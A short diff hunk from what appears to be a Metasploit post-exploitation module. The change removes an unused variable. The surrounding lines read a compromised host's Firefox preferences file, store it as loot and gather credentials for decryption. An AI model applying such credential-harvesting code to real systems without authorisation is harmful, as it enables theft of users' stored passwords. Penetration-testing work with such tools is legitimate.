@@ -39,7 +39,6 @@ class Metasploit3 < Msf::Post
     credentials = [] # All credentials to be decrypted
     db_paths.each do |db_path|
       if db_path =~ /Mozilla/i # Firefox
-        password_line = nil
         # Read and store the remote preferences file locally
         data = read_file(db_path)
         loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{db_path}")
